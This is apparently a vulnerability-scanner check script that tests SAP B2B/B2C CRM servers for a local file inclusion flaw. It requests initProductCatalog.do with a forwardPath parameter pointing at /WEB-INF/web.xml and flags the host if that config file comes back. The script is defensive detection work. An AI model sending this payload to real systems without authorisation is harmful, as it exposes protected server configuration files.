/**
title: SAP B2B LFI
tags: sap, lfi
description:
    SAP B2B / B2C CRM 2.x < 4.x - Local File Inclusion
**/

/// <reference path="../native.d.ts"/>

// debugging
function trace(msg) {
    //    ax.log(1, "LOG:" + msg);
}

var lastJob = false;

// alert the vulnerability
function alert() {
    scanState.addVuln({
        typeId: "sap_b2b_lfi.xml",
        location: scriptArg.location,
        http: lastJob
    });
}

// tests for LFI
function testVulnerability(url) {
    let up = ax.url.parse(url.toString());
    up.path += "initProductCatalog.do?forwardPath=/WEB-INF/web.xml";

    // prepare a http request
    let job = ax.http.job();

    job.verb = "GET";
    job.setUrl(up);

    lastJob = ax.http.execute(job).sync();

    // check if it matches the web.xml regex
    if (!lastJob.error && lastJob.response.status == 200) {
        if (lastJob.response.body.match(/<web\-app[\s\S]*?<\/web\-app>/gm)) {
            //trace("found, alert here!");
            alert();
        }
    }
}

// main function
function main() {
    var url = false;

    if (scriptArg.location.isFolder) { // test folders
        url = scriptArg.location.url;
        if (!url.path.endsWith("/")) url.path += "/";

        // test all folders where the path ends with _b2b
        if (url.path.endsWith("_b2b/"))
            testVulnerability(url);
    }
}

main();
